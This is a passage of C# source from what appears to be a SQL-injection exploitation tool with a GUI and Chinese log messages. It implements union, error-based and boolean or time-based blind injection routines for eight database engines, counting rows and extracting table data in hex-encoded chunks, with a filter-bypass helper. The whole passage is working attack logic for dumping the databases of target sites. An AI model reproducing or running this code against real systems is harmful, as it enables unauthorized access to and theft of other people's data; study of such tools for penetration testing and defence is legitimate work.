            try
            {

                GetDataPam gp = (GetDataPam)opam;
                String datas_value_payload = MySQL.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, gp.columns, gp.table, gp.dbname, gp.limit);
                String result = getOneDataByUnionOrError(MySQL.union_value.Replace("{data}", datas_value_payload));

                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，获取到第" + (gp.limit + 1) + "行数据", LogLevel.info);
                String[] datas = Regex.Split(result, "\\$\\$\\$");
                addItemToListView(datas);

            }
            catch (Exception e)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }


        /// <summary>
        /// 获取数据，union方式
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByUnionBySQLServer(Object opam)
        {
            try
            {
                GetDataPam gp = (GetDataPam)opam;
                ListViewItem lvi = new ListViewItem();
                String result = getOneDataByUnionOrError(SQLServer.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, gp.dbname, gp.table, gp.columns, gp.limit));
                //数结果改成xml格式，单独解析
                addItemToListViewBySQLServerXMLData(result, gp.columns);
                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + gp.limit + "行的值！", LogLevel.info);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }

        /// <summary>
        /// 获取数据，union方式
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByUnionByAccess(Object opam)
        {
            try
            {
                GetDataPam gp = (GetDataPam)opam;
                ListViewItem lvi = new ListViewItem();
                String result = getOneDataByUnionOrError(Access.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, gp.columns, gp.table, gp.limit.ToString()).Replace("{table}", this.curren_table));
                this.Invoke(new addItemToListViewByColumnsDelegate(addItemToListViewByColumns), result);
                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + gp.limit + "行的值！", LogLevel.info);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }

        /// <summary>
        /// 获取数据，union方式
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByUnionBySQLite(Object opam)
        {
            try
            {
                GetDataPam gp = (GetDataPam)opam;
                ListViewItem lvi = new ListViewItem();
                String result = getOneDataByUnionOrError(SQLite.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, gp.columns, gp.table, gp.limit.ToString()));
                this.Invoke(new addItemToListViewByColumnsDelegate(addItemToListViewByColumns), result);
                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + (gp.limit + 1) + "行的值！", LogLevel.info);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }


        /// <summary>
        /// 获取数据，union方式
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByUnionByOracle(Object opam)
        {
            try
            {
                GetDataPam gp = (GetDataPam)opam;
                ListViewItem lvi = new ListViewItem();
                String result = getOneDataByUnionOrError(Oracle.getUnionDataValue(config.columnsCount, config.showColumn, gp.columns, gp.dbname, gp.table, gp.limit.ToString()));
                this.Invoke(new addItemToListViewByColumnsDelegate(addItemToListViewByColumns), result);
                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + gp.limit + "行的值！", LogLevel.info);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }

        /// <summary>
        /// 获取数据，union方式
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByUnionByDB2(Object opam)
        {
            try
            {
                GetDataPam gp = (GetDataPam)opam;
                ListViewItem lvi = new ListViewItem();
                //每行数据只能获取最大值254个字符
                String result = getOneDataByUnionOrError(DB2.getUnionDataValue(config.unionFillTemplate, gp.columns, gp.dbname, gp.table, gp.limit.ToString()));
                this.Invoke(new addItemToListViewByColumnsDelegate(addItemToListViewByColumns), result);
                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + gp.limit + "行的值！", LogLevel.info);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }

        /// <summary>
        /// 获取数据，union方式
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByUnionByInformix(Object opam)
        {
            try
            {
                GetDataPam gp = (GetDataPam)opam;
                ListViewItem lvi = new ListViewItem();
                String result = getOneDataByUnionOrErrorByInformix(Informix.getUnionDataValue(config.unionFillTemplate, gp.columns, gp.dbname, gp.table, gp.limit.ToString()));
                this.Invoke(new addItemToListViewByColumnsDelegate(addItemToListViewByColumnsInformix), result);
                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + (gp.limit + 1) + "行的值！", LogLevel.info);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }

        /// <summary>
        /// 获取数据，union方式
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByUnionByPostgreSQL(Object opam)
        {
            try
            {
                GetDataPam gp = (GetDataPam)opam;
                ListViewItem lvi = new ListViewItem();
                String result = getOneDataByUnionOrError(PostgreSQL.getUnionDataValue(config.columnsCount, config.showColumn, gp.columns, gp.dbname, gp.table, gp.limit.ToString()));
                this.Invoke(new addItemToListViewByColumnsDelegate(addItemToListViewByColumns), result);
                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + (gp.limit + 1) + "行的值！", LogLevel.info);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }

        public void addItemToListView(String[] columnsValue)
        {

            ListViewItem lvi = null;
            foreach (String d in columnsValue)
            {
                if (lvi == null)
                {
                    lvi = new ListViewItem(d);
                }
                else
                {
                    lvi.SubItems.Add(d);
                }
            }
            if (lvi != null)
            {
                this.data_dbs_lvw_data.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
            }
        }

        /// <summary>
        /// 获取数据MySQL，error方式,这个长度有限，需要判断是否大于错误消息的长度限制是64个
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByErrorByMySQL(Object opam)
        {
            try
            {
                GetDataPam gp = (GetDataPam)opam;
                //获取数据长度

                String datas_payload_columns = MySQL.hex_value.Replace("{data}", MySQL.creatMySQLColumnsStr(gp.columns, gp.table, gp.dbname, gp.limit));
                String datas_payload_length = MySQL.concatMySQLColumn(MySQL.char_length.Replace("{data}", datas_payload_columns));

                String datas_payload_length_error = MySQL.error_value.Replace("{data}", datas_payload_length);

                String result_length = getOneDataByUnionOrError(datas_payload_length_error);

                int sumlen = Tools.convertToInt(result_length);

                String result = "";
                int start = 1;
                //每次获取长度，err方式有长度限制59个字符
                int count = 64 - 6;
                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，正在获取数据，每次请求将获取" + count + "字符！", LogLevel.info);
                while (start < sumlen)
                {
                    //hex编码，防止中文等乱码
                    String datas_value_column = ByPassForBetween(MySQL.substr_value.Replace("{data}", datas_payload_columns).Replace("{start}", start.ToString()), count);
                    String c_datas_value_payload = MySQL.error_value.Replace("{data}", MySQL.concatMySQLColumn(datas_value_column));
                    result += getOneDataByUnionOrError(c_datas_value_payload);
                    start += count;
                }

                result = Tools.unHex(result, "UTF-8");

                String[] items = Regex.Split(result, "\\$\\$\\$");
                ListViewItem lvi = null;
                foreach (String item in items)
                {
                    if (lvi == null)
                    {

                        lvi = new ListViewItem(item);
                    }
                    else
                    {
                        lvi.SubItems.Add(item);
                    }
                }
                this.data_dbs_lvw_data.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + (gp.limit + 1) + "行的值！", LogLevel.info);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);

        }

        /// <summary>
        /// 获取数据SQLServer，error方式,这个长度有一定限制
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByErrorBySQLServer(Object opam)
        {
            try
            {
                GetDataPam gp = (GetDataPam)opam;
                ListViewItem lvi = new ListViewItem();
                String result = getOneDataByUnionOrError(SQLServer.getErrorDataValue(gp.dbname, gp.table, gp.limit, gp.columns));
                result = HttpUtility.HtmlDecode(result);
                this.Invoke(new addItemToListViewByColumnsDelegate(addItemToListViewByColumns), result);
                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + gp.limit + "行的值！", LogLevel.info);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);

        }

        /// <summary>
        /// 获取数据PostgreSQL，error方式,这个长度有一定限制
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByErrorByPostgreSQL(Object opam)
        {
            try
            {
                GetDataPam gp = (GetDataPam)opam;
                ListViewItem lvi = new ListViewItem();
                String result = getOneDataByUnionOrError(PostgreSQL.getErrorDataValue(gp.dbname, gp.table, gp.limit, gp.columns));
                result = HttpUtility.HtmlDecode(result);
                this.Invoke(new addItemToListViewByColumnsDelegate(addItemToListViewByColumns), result);
                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + gp.limit + "行的值！", LogLevel.info);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);

        }

        /// <summary>
        /// 获取数据oracle，error方式,这个长度有限，需要判断是否大于错误消息的长度限制是256个
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByErrorByOracle(Object opam)
        {
            try
            {
                GetDataPam gp = (GetDataPam)opam;
                ListViewItem lvi = new ListViewItem();
                String datas_len_payload = Oracle.getErrorDataLen(gp.columns, gp.dbname, gp.table, gp.limit.ToString());
                String result_length = getOneHexDataByUnionOrError(Oracle.error_value.Replace("{data}", datas_len_payload));

                int sumlen = Tools.convertToInt(result_length);
                String result = "";
                int start = 1;
                //每次获取长度，err方式有长度限制
                int count = 205;
                if (count < 1)
                {

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，选择的列太多了，无法获取数据！", LogLevel.info);
                    return;
                }
                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，正在获取数据，每次请求将获取" + count + "个hex字符！", LogLevel.info);
                while (start < sumlen)
                {
                    //hex编码，防止中文等乱码
                    String tmp_data_payload = Oracle.getDataValue(gp.columns, gp.dbname, gp.table, gp.limit.ToString());
                    String err_tmp_data_payload = ByPassForBetween(Oracle.substr_error_value.Replace("{data}", tmp_data_payload).Replace("{start}", start.ToString()), count);
                    result += getOneHexNoUnHexDataByUnionOrError(err_tmp_data_payload);
                    start += count;
                }

                result = Tools.unHex(result, config.db_encoding);

                this.Invoke(new addItemToListViewByColumnsDelegate(addItemToListViewByColumns), result);
                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + gp.limit + "行的值！", LogLevel.info);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }

        public void getDatasByBool(DBType dbtype, List<String> columns, int start, int dataCount)
        {
            if (start < 0)
            {
                MessageBox.Show("开始下标不能小于0！");
                return;
            }
            bool isMax = false;
            switch (dbtype)
            {

                case DBType.Access:
                    isMax = findKeyInBody(Access.bool_datas_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table), start + dataCount);
                    if (isMax)
                    {
                        //下标从1开始
                        for (int i = 1; i <= dataCount; i++)
                        {
                            GetDataPam gd = new GetDataPam();
                            gd.columns = columns;
                            gd.dbname = this.curren_db;
                            gd.table = this.curren_table;
                            gd.limit = start + i;
                            gd.isMuStr = config.isMuStr;
                            stp.WaitFor(100);
                            stp.QueueWorkItem<GetDataPam>(getDataValueByBoolByAccess, gd);
                        }
                        stp.WaitForIdle();
                    }
                    else
                    {

                        MessageBox.Show("没有这么多行数据，请改小点！");
                    }
                    break;
                case DBType.MySQL:

                    if (config.keyType.Equals(KeyType.Time))
                    {
                        isMax = findKeyInBody(MySQL.getBoolCountBySleep(MySQL.bool_datas_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table), config.maxTime), (start + dataCount));
                    }
                    else
                    {
                        isMax = findKeyInBody(MySQL.bool_datas_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table), (start + dataCount));
                    }

                    if (isMax)
                    {
                        for (int i = 0; i < dataCount; i++)
                        {
                            GetDataPam gd = new GetDataPam();
                            gd.columns = columns;
                            gd.dbname = this.curren_db;
                            gd.table = this.curren_table;
                            gd.limit = start + i;
                            gd.isMuStr = config.isMuStr;
                            stp.WaitFor(100);
                            stp.QueueWorkItem<GetDataPam>(getDataValueByBoolByMySQL, gd);
                        }
                        stp.WaitForIdle();
                    }
                    else
                    {

                        MessageBox.Show("没有这么多行数据，请改小点！");
                    }

                    break;
                case DBType.SQLServer:
                    if (config.keyType.Equals(KeyType.Time))
                    {
                        isMax = findKeyInBody(SQLServer.getBoolDataBySleep(SQLServer.bool_datas_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table), config.maxTime), start + dataCount);
                    }
                    else
                    {
                        isMax = findKeyInBody(SQLServer.bool_datas_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table), start + dataCount);
                    }

                    if (isMax)
                    {
                        //下标从1开始
                        for (int i = 1; i <= dataCount; i++)
                        {
                            GetDataPam gd = new GetDataPam();
                            gd.columns = columns;
                            gd.dbname = this.curren_db;
                            gd.table = this.curren_table;
                            gd.limit = start + i;
                            gd.isMuStr = config.isMuStr;
                            stp.WaitFor(100);
                            if (config.keyType.Equals(KeyType.Time))
                            {
                                stp.QueueWorkItem<GetDataPam>(getDataValueByBoolBySQLServerSleep, gd);
                            }
                            else
                            {
                                stp.QueueWorkItem<GetDataPam>(getDataValueByBoolBySQLServer, gd);
                            }

                        }
                        stp.WaitForIdle();
                    }
                    else
                    {
                        MessageBox.Show("没有这么多行数据，请改小点！");
                    }

                    break;
                case DBType.Oracle:
                    isMax = findKeyInBody(Oracle.bool_datas_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table), start + dataCount);
                    if (isMax)
                    {
                        for (int i = 1; i <= dataCount; i++)
                        {
                            GetDataPam gd = new GetDataPam();
                            gd.columns = columns;
                            gd.dbname = this.curren_db;
                            gd.table = this.curren_table;
                            gd.limit = start + i;
                            gd.isMuStr = config.isMuStr;
                            stp.WaitFor(100);
                            stp.QueueWorkItem<GetDataPam>(getDataValueByBoolByOracle, gd);
                        }
                        stp.WaitForIdle();
                    }
                    else
                    {

                        MessageBox.Show("没有这么多行数据，请改小点！");
                    }

                    break;

                case DBType.PostgreSQL:

                    if (config.keyType.Equals(KeyType.Time))
                    {
                        isMax = findKeyInBody(PostgreSQL.getBoolCountBySleep(PostgreSQL.bool_datas_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table), config.maxTime), (start + dataCount));
                    }
                    else
                    {
                        isMax = findKeyInBody(PostgreSQL.bool_datas_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table), (start + dataCount));
                    }

                    if (isMax)
                    {
                        for (int i = 0; i < dataCount; i++)
                        {
                            GetDataPam gd = new GetDataPam();
                            gd.columns = columns;
                            gd.dbname = this.curren_db;
                            gd.table = this.curren_table;
                            gd.limit = start + i;
                            gd.isMuStr = config.isMuStr;
                            stp.WaitFor(100);
                            stp.QueueWorkItem<GetDataPam>(getDataValueByBoolByPostgreSQL, gd);
                        }
                        stp.WaitForIdle();
                    }
                    else
                    {

                        MessageBox.Show("没有这么多行数据，请改小点！");
                    }
                    break;
                case DBType.DB2:
                    isMax = findKeyInBody(DB2.bool_datas_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table), start + dataCount);
                    if (isMax)
                    {
                        for (int i = 1; i <= dataCount; i++)
                        {
                            GetDataPam gd = new GetDataPam();
                            gd.columns = columns;
                            gd.dbname = this.curren_db;
                            gd.table = this.curren_table;
                            gd.limit = start + i;
                            gd.isMuStr = config.isMuStr;
                            stp.WaitFor(100);
                            stp.QueueWorkItem<GetDataPam>(getDataValueByBoolByDB2, gd);
                        }
                        stp.WaitForIdle();
                    }
                    else
                    {

                        MessageBox.Show("没有这么多行数据，请改小点！");
                    }

                    break;
                case DBType.SQLite:
                    isMax = findKeyInBody(SQLite.bool_datas_count.Replace("{table}", this.curren_table), start + dataCount);

                    if (isMax)
                    {
                        //下标从1开始
                        for (int i = 0; i < dataCount; i++)
                        {
                            GetDataPam gd = new GetDataPam();
                            gd.columns = columns;
                            gd.dbname = this.curren_db;
                            gd.table = this.curren_table;
                            gd.limit = start + i;
                            gd.isMuStr = config.isMuStr;
                            stp.WaitFor(100);
                            stp.QueueWorkItem<GetDataPam>(getDataValueByBoolBySQLite, gd);

                        }
                        stp.WaitForIdle();
                    }
                    else
                    {
                        MessageBox.Show("没有这么多行数据，请改小点！");
                    }

                    break;
                case DBType.Informix:
                    if (config.keyType.Equals(KeyType.Time))
                    {
                        isMax = findKeyInBody(Informix.getBoolCountBySleep(Informix.bool_datas_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table)), (start + dataCount));
                    }
                    else
                    {
                        isMax = findKeyInBody(Informix.bool_datas_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table), start + dataCount);
                    }

                    if (isMax)
                    {
                        for (int i = 0; i < dataCount; i++)
                        {
                            GetDataPam gd = new GetDataPam();
                            gd.columns = columns;
                            gd.dbname = this.curren_db;
                            gd.table = this.curren_table;
                            gd.limit = start + i;
                            gd.isMuStr = config.isMuStr;
                            stp.WaitFor(100);
                            stp.QueueWorkItem<GetDataPam>(getDataValueByBoolByInformix, gd);
                        }
                        stp.WaitForIdle();
                    }
                    else
                    {

                        MessageBox.Show("没有这么多行数据，请改小点！");
                    }

                    break;
            }

        }


        public void getDatasByError(DBType dbtype, List<String> columns, int start, int dataCount)
        {
            List<String> data_list = new List<String>();
            String datas_count_payload = "";
            String result = "";

            switch (dbtype)
            {

                case DBType.Access:
                    MessageBox.Show(ErrorMessage.access_no_error_inject_info);
                    break;
                case DBType.MySQL:
                    data_list.Add(MySQL.data_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table));
                    datas_count_payload = MySQL.creatMySQLColumnsStrByError(data_list, null, null, -1);
                    result = getOneDataByUnionOrError(MySQL.error_value.Replace("{data}", datas_count_payload));

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！", LogLevel.success);

                    this.dataCount = Tools.convertToInt(result);

                    if (this.dataCount < (dataCount + start))
                    {
                        this.txt_log.Invoke(new showLogDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！", LogLevel.waring);
                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
                        break;
                    }

                    for (int i = 0; i < dataCount; i++)
                    {
                        GetDataPam gd = new GetDataPam();
                        gd.columns = columns;
                        gd.dbname = this.curren_db;
                        gd.table = this.curren_table;
                        gd.limit = start + i;
                        gd.isMuStr = config.isMuStr;
                        stp.WaitFor(100);
                        stp.QueueWorkItem<GetDataPam>(getDataValueByErrorByMySQL, gd);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.SQLServer:
                    result = getOneDataByUnionOrError(SQLServer.error_value.Replace("{data}", SQLServer.data_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table)));
                    //HTML解码
                    result = HttpUtility.HtmlDecode(result);
                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！", LogLevel.success);

                    this.dataCount = Tools.convertToInt(result);

                    if (this.dataCount < (dataCount + start))
                    {
                        this.txt_log.Invoke(new showLogDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！", LogLevel.waring);
                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
                        break;
                    }
                    //注意下标从1开始
                    for (int i = 1; i <= dataCount; i++)
                    {
                        GetDataPam gd = new GetDataPam();
                        gd.columns = columns;
                        gd.dbname = this.curren_db;
                        gd.table = this.curren_table;
                        gd.limit = start + i;
                        gd.isMuStr = config.isMuStr;
                        //按照一行的一列一列开始获取
                        stp.WaitFor(100);
                        stp.QueueWorkItem<GetDataPam>(getDataValueByErrorBySQLServer, gd);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.Oracle:
                    result = getOneHexDataByUnionOrError(Oracle.getErrorDataValue(Oracle.data_count, this.curren_db, this.curren_table, ""));

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！", LogLevel.success);

                    this.dataCount = Tools.convertToInt(result);

                    if (this.dataCount < (dataCount + start))
                    {
                        this.txt_log.Invoke(new showLogDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！", LogLevel.waring);
                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
                        break;
                    }
                    //注意下标从1开始
                    for (int i = 1; i <= dataCount; i++)
                    {
                        GetDataPam gd = new GetDataPam();
                        gd.columns = columns;
                        gd.dbname = this.curren_db;
                        gd.table = this.curren_table;
                        gd.limit = start + i;
                        gd.isMuStr = config.isMuStr;
                        //按照一行的一列一列开始获取
                        stp.WaitFor(100);
                        stp.QueueWorkItem<GetDataPam>(getDataValueByErrorByOracle, gd);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.PostgreSQL:
                    result = getOneDataByUnionOrError(PostgreSQL.error_value.Replace("{data}", PostgreSQL.data_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table)));
                    //HTML解码
                    result = HttpUtility.HtmlDecode(result);
                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！", LogLevel.success);

                    this.dataCount = Tools.convertToInt(result);

                    if (this.dataCount < (dataCount + start))
                    {
                        this.txt_log.Invoke(new showLogDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！", LogLevel.waring);
                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
                        break;
                    }
                    //注意下标从1开始
                    for (int i = 0; i < dataCount; i++)
                    {
                        GetDataPam gd = new GetDataPam();
                        gd.columns = columns;
                        gd.dbname = this.curren_db;
                        gd.table = this.curren_table;
                        gd.limit = start + i;
                        gd.isMuStr = config.isMuStr;
                        //按照一行的一列一列开始获取
                        stp.WaitFor(100);
                        stp.QueueWorkItem<GetDataPam>(getDataValueByErrorByPostgreSQL, gd);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.DB2:
                    MessageBox.Show("抱歉DB2数据库暂不支持显错方式获取数据！");
                    break;
            }

        }


        public void getDatasByUnion(DBType dbtype, List<String> columns, int start, int dataCount)
        {
            List<String> data_list = new List<String>();
            String datas_count_payload = "";
            String result = "";

            switch (dbtype)
            {

                case DBType.Access:

                    datas_count_payload = Access.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, Access.data_count.Replace("{table}", this.curren_table));
                    result = getOneDataByUnionOrError(datas_count_payload);

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！", LogLevel.success);

                    this.dataCount = Tools.convertToInt(result);

                    if (this.dataCount < (dataCount + start))
                    {
                        this.txt_log.Invoke(new showLogDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！", LogLevel.waring);
                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
                        break;
                    }
                    //下标从1开始
                    for (int i = 1; i <= dataCount; i++)
                    {
                        GetDataPam gd = new GetDataPam();
                        gd.columns = columns;
                        gd.dbname = this.curren_db;
                        gd.table = this.curren_table;
                        gd.limit = start + i;
                        gd.isMuStr = config.isMuStr;
                        stp.WaitFor(100);
                        stp.QueueWorkItem<GetDataPam>(getDataValueByUnionByAccess, gd);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.MySQL:
                    data_list.Add(MySQL.data_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table));
                    datas_count_payload = MySQL.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
                    result = getOneDataByUnionOrError(MySQL.union_value.Replace("{data}", datas_count_payload));

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！", LogLevel.success);

                    this.dataCount = Tools.convertToInt(result);
                    if (this.dataCount < (dataCount + start))
                    {
                        this.txt_log.Invoke(new showLogDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！", LogLevel.waring);
                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
                        break;
                    }

                    for (int i = 0; i < dataCount; i++)
                    {
                        GetDataPam gd = new GetDataPam();
                        gd.columns = columns;
                        gd.dbname = this.curren_db;
                        gd.table = this.curren_table;
                        gd.limit = start + i;
                        gd.isMuStr = config.isMuStr;
                        stp.WaitFor(100);
                        stp.QueueWorkItem<GetDataPam>(getDataValueByUnionByMySQL, gd);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.SQLServer:

                    datas_count_payload = SQLServer.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLServer.data_count, this.curren_db, this.curren_table, "");
                    result = getOneDataByUnionOrError(datas_count_payload);

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！", LogLevel.success);

                    this.dataCount = Tools.convertToInt(result);

                    if (this.dataCount < (dataCount + start))
                    {
                        this.txt_log.Invoke(new showLogDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！", LogLevel.waring);
                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
                        break;
                    }
                    //下标从1开始
                    for (int i = 1; i <= dataCount; i++)
                    {
                        GetDataPam gd = new GetDataPam();
                        gd.columns = columns;
                        gd.dbname = this.curren_db;
                        gd.table = this.curren_table;
                        gd.limit = start + i;
                        gd.isMuStr = config.isMuStr;
                        stp.WaitFor(100);
                        stp.QueueWorkItem<GetDataPam>(getDataValueByUnionBySQLServer, gd);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.Oracle:
                    datas_count_payload = Oracle.getUnionDataValue(config.columnsCount, config.showColumn, Oracle.data_count, this.curren_db, this.curren_table, "");
                    result = getOneDataByUnionOrError(datas_count_payload);

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！", LogLevel.success);

                    this.dataCount = Tools.convertToInt(result);

                    if (this.dataCount < (dataCount + start))
                    {
                        this.txt_log.Invoke(new showLogDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！", LogLevel.waring);
                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
                        break;
                    }
                    //下标从1开始
                    for (int i = 1; i <= dataCount; i++)
                    {
                        GetDataPam gd = new GetDataPam();
                        gd.columns = columns;
                        gd.dbname = this.curren_db;
                        gd.table = this.curren_table;
                        gd.limit = start + i;
                        gd.isMuStr = config.isMuStr;
                        stp.WaitFor(100);
                        stp.QueueWorkItem<GetDataPam>(getDataValueByUnionByOracle, gd);
                    }
                    stp.WaitForIdle();
                    break;

                case DBType.PostgreSQL:
                    datas_count_payload = PostgreSQL.getUnionDataValue(config.columnsCount, config.showColumn, PostgreSQL.data_count, this.curren_db, this.curren_table, "");
                    result = getOneDataByUnionOrError(datas_count_payload);

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！", LogLevel.success);

                    this.dataCount = Tools.convertToInt(result);

                    if (this.dataCount < (dataCount + start))
                    {
                        this.txt_log.Invoke(new showLogDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！", LogLevel.waring);
                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
                        break;
                    }
                    //下标从1开始
                    for (int i = 0; i < dataCount; i++)
                    {
                        GetDataPam gd = new GetDataPam();
                        gd.columns = columns;
                        gd.dbname = this.curren_db;
                        gd.table = this.curren_table;
                        gd.limit = start + i;
                        gd.isMuStr = config.isMuStr;
                        stp.WaitFor(100);
                        stp.QueueWorkItem<GetDataPam>(getDataValueByUnionByPostgreSQL, gd);
                    }
                    stp.WaitForIdle();
                    break;
